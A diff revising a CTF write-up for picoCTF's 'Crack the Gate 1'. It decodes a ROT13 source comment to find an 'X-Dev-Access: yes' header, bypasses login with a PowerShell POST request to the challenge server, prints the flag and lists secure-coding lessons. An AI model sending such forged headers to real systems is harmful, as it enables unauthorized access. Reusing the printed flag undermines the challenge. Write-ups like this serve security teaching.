@@ -1,67 +1,106 @@
 # 🔓 Crack the Gate 1 — Writeup
 
-## 📋 What's the Challenge?
-
-You're given a **login page**. You need to get in. But instead of guessing the password, you find a **secret shortcut** hidden in the code. 🕵️
-
----
-
-## 🎯 What You're Working With
-
-| **Item** | **Value** |
-| :--- | :--- |
-| 📧 Email | `ctf-player@picoctf.org` |
-| 🌐 Endpoint | `POST /login` |
-| 🧩 Difficulty | Easy (Beginner) |
+> **Category:** Web Exploitation
+> **Difficulty:** Easy
+> **Platform:** picoCTF
 
 ---
 
-## 👀 Step 1: Look at the Page Source
+## 📋 Challenge Overview
 
-Open the page in your browser → **Right-click** → **View Page Source**.
+The challenge provides a **login page** that appears to require valid credentials.
 
-You'll find a hidden comment that looks like nonsense:
+Instead of attempting to guess or brute-force the password, the objective is to **inspect the application and identify an unintended authentication bypass** hidden within the source code.
+
+### 🎯 Challenge Information
+
+| Property          | Details                                     |
+| :---------------- | :------------------------------------------ |
+| 📧 **Email**      | `ctf-player@picoctf.org`                    |
+| 🌐 **Endpoint**   | `POST /login`                               |
+| 🧩 **Difficulty** | Easy                                        |
+| 🎯 **Objective**  | Bypass authentication and retrieve the flag |
+
+---
+
+## 🔎 1. Inspect the Page Source
+
+The first step is to inspect the HTML source of the login page.
+
+In the browser:
+
+**Right-click → View Page Source**
+
+While examining the source, we discover the following suspicious comment:
 
 ```text
 ABGR: Wnpx - grzcbenel olcnff: hfr urnqre K-Qri-Npprff: lrf
+```
 
-🤔 "What is this?? Random letters?"
+At first glance, it looks like random text. However, the structure suggests that it may be encoded rather than encrypted.
 
-Nope! It's a code.
+---
 
-🔑 Step 2: Decode the Secret Message
+## 🔐 2. Decode the Hidden Message
 
-This is ROT13 — a simple substitution cipher where every letter is shifted 13 positions in the alphabet.
+The string is encoded using **ROT13**.
 
-A → N
-B → O
-C → P
-D → Q
+ROT13 substitutes each letter with the letter located **13 positions away** in the alphabet.
+
+```text
+A ↔ N
+B ↔ O
+C ↔ P
+D ↔ Q
 ...
-N → A
-O → B
-P → C
+M ↔ Z
+```
 
-So, swapping each letter by 13 positions gives:
+Decoding the comment reveals:
 
-📝 NOTE: Jack — temporary bypass: use header X-Dev-Access: yes
+```text
+NOTE: Jack - temporary bypass: use header X-Dev-Access: yes
+```
 
-🚪 Step 3: What Does This Mean?
+### 💡 Key Finding
 
-Imagine a building with:
+The source code has revealed an HTTP header that can be used as an **authentication bypass**:
 
-🚪 Front door → needs a key (password)
-🚪 Back door → open to anyone who says the magic word
-
-Jack, the developer, accidentally left the back door open in the code.
-
-The magic word is this HTTP header:
-
+```http
 X-Dev-Access: yes
+```
 
-If you include this header in your request, the server accepts the request without requiring the correct password.
+---
 
-💥 Step 4: Exploit It with PowerShell
+## 🚪 3. Understanding the Bypass
+
+The application appears to trust the value of the `X-Dev-Access` header.
+
+Conceptually, the application is behaving like this:
+
+```text
+Normal Login
+     │
+     ├── Correct credentials ──→ ✅ Access granted
+     │
+     └── Incorrect credentials → ❌ Access denied
+
+Developer Header
+     │
+     └── X-Dev-Access: yes ────→ ✅ Authentication bypass
+```
+
+This indicates that a **development/debugging mechanism was accidentally exposed in the production application**.
+
+---
+
+## 💥 4. Exploit the Vulnerability
+
+We can send a `POST` request to `/login` while adding the discovered header.
+
+### PowerShell
+
+```powershell
 $response = Invoke-WebRequest -Uri "http://amiable-citadel.picoctf.net:61372/login" `
   -Method POST `
   -Headers @{ "X-Dev-Access" = "yes" } `
@@ -69,15 +108,69 @@ $response = Invoke-WebRequest -Uri "http://amiable-citadel.picoctf.net:61372/log
   -ContentType "application/x-www-form-urlencoded"
 
 $response.Content
+```
 
-🎉 The flag appears in the response. You didn't need the real password!
+The password does not need to be valid because the `X-Dev-Access: yes` header triggers the authentication bypass.
 
-🏆 Flag
+---
+
+## 🏆 5. Flag
+
+The server returns the flag in the response:
+
+```text
 picoCTF{brut4_f0rc4_0d39383f}
-🧠 What Did We Learn?
-✅ Good Practice	❌ What Went Wrong
-Remove debug code before going live	Left a backdoor in production
-Never trust user-controlled headers	Trusted X-Dev-Access blindly
-Don't hide secrets in comments	Encoded a secret in plain sight
+```
 
-💡 Real-world lesson: Encoding a secret doesn't make it secure. Anyone who can view the source can decode it. Remove debug code and development bypasses before deploying to production. 🚫🔑
+> **Flag:** `picoCTF{brut4_f0rc4_0d39383f}`
+
+---
+
+## 🧠 6. What Did We Learn?
+
+### 🔴 Vulnerability
+
+The application trusted a **user-controlled HTTP header** to determine whether the requester had developer-level access.
+
+This is an example of an **authentication/authorization bypass caused by insecure trust in client-controlled input**.
+
+### 🛡️ Security Lessons
+
+| Secure Practice                                              | What Went Wrong                              |
+| :----------------------------------------------------------- | :------------------------------------------- |
+| Remove debug functionality before deployment                 | A development bypass remained active         |
+| Never trust client-controlled headers for authorization      | `X-Dev-Access` was trusted blindly           |
+| Never expose secrets or sensitive information in source code | The bypass was disclosed in a source comment |
+| Properly enforce authentication server-side                  | Authentication could be bypassed entirely    |
+
+---
+
+## 📌 Key Takeaway
+
+> **Encoding is not encryption, and hiding something in source code does not make it secret.**
+
+The entire attack chain was:
+
+```text
+View Source
+    ↓
+Find suspicious comment
+    ↓
+Identify ROT13
+    ↓
+Decode hidden message
+    ↓
+Discover X-Dev-Access header
+    ↓
+Send crafted POST request
+    ↓
+Bypass authentication
+    ↓
+Retrieve flag
+```
+
+### ⚔️ Final Lesson
+
+**Always inspect the application before attacking it.**
+
+A small piece of leaked development information can sometimes reveal an entire attack path.
